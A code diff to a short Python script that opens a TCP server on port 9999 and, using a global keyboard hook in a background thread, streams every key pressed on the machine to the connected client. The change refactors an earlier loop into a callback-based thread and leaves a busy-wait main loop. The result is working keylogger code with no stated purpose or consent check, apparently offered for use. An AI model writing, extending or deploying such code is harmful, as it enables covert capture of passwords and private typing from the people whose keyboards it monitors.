@@ -2,21 +2,26 @@ import threading
 import keyboard
 import socket
 
+def send_keys(client):
+    def on_key(event):
+        try:
+            client.send(f"{event.name}\n".encode())
+        except:
+            pass  # connection might be closed
+
+    keyboard.on_press(on_key)
+    keyboard.wait()  # Keep the thread alive
+
 if __name__ == '__main__':
-    # Create a TCP socket
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # Bind the server to all interfaces on port 9999
     server.bind(('0.0.0.0', 9999))
-
-    # Start listening for incoming connections (up to 5 queued connections)
     server.listen(5)
-
-    # Accept a new client connection
     client, addr = server.accept()
-    print(client.recv(1024).decode())  # Receive greeting message from client
+
+    print(client.recv(1024).decode())  # greeting
+
+    # Start sending key events in another thread
+    threading.Thread(target=send_keys, args=(client,), daemon=True).start()
 
     while True:
-        current_key = keyboard.read_key()
-        if current_key != None:
-            client.send(f"{str(current_key)}\n".encode())
+        pass  # Keep main thread alive
